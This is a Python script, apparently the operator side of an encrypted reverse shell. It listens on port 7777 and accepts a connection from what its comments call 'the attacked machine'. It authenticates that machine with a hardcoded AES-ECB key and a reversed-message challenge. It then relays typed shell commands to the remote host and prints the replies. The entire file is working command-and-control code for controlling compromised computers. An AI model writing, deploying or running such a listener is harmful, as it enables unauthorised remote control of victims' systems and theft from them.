import socket
import struct
import time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# CONFIG
PORT = 7777
key = b"thisisa16bytekey"

def encrypt(key, plaintext):
    #Padding to 16 bytes (for AES)
    while len(plaintext) % 16 != 0:
        plaintext += ' ' 
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext.encode()) + encryptor.finalize()
    return ciphertext

def decrypt(key, ciphertext):
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(ciphertext) + decryptor.finalize()
    return decrypted.decode().rstrip()

def recv_data(sock):
    raw_len = sock.recv(4) # We first grab the length of the output before receiving it all to avoid buffer issues
    if not raw_len:
        return None
    length = struct.unpack(">I", raw_len)[0] 
    received_data = b"" 

    # There is a chance that either script may read from the buffer of data we are using to send data too early, so we accumulate data
    while len(received_data) < length:
        chunk = sock.recv(length - len(received_data))  # Read the remaining bytes
        if not chunk:
            break 
        received_data += chunk 

    return received_data

def send_data(sock, data):
    # Send the length + the data
    length = struct.pack(">I", len(data)) 
    sock.sendall(length + data)
    
def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(1)

    print(f"[0] Listening on :{PORT}")
    client_socket, client_address = server.accept()
    print(f"[0] Connection from {client_address[0]}:{client_address[1]}")

    # We get the secret message from the attacked machine, decrypt it,
    # reverse it, and send it back to prove our identity.

    encrypted_message = recv_data(client_socket)
    decrypted_message = decrypt(key, encrypted_message)

    reversed_message = decrypted_message[::-1]

    encrypted_reversed = encrypt(key, reversed_message)
    send_data(client_socket, encrypted_reversed)
    
    auth_response = recv_data(client_socket)
    decrypted_response = decrypt(key, auth_response)
    
    if decrypted_response == "authenticated":
        print("[0] Authentication successful!")
    else:
        print("[0] Invalid key or message! Closing connection.")
        client_socket.close()
        return

    try:
        while True:
            command = input("shell: ")
            if command.lower() == 'exit':
                send_data(client_socket, encrypt(key, command))
                print("[0] Closing connection...")
                break

            send_data(client_socket, encrypt(key, command))
            
            response = recv_data(client_socket)
            decrypted_response = decrypt(key, response)
            if decrypted_response:
                print(f"{decrypted_response}")
            else:
                print("No response received. Command ran.")

    except KeyboardInterrupt:
        print("\n[0] Exiting...")
    finally:
        client_socket.close()
        server.close()

if __name__ == "__main__":
    main()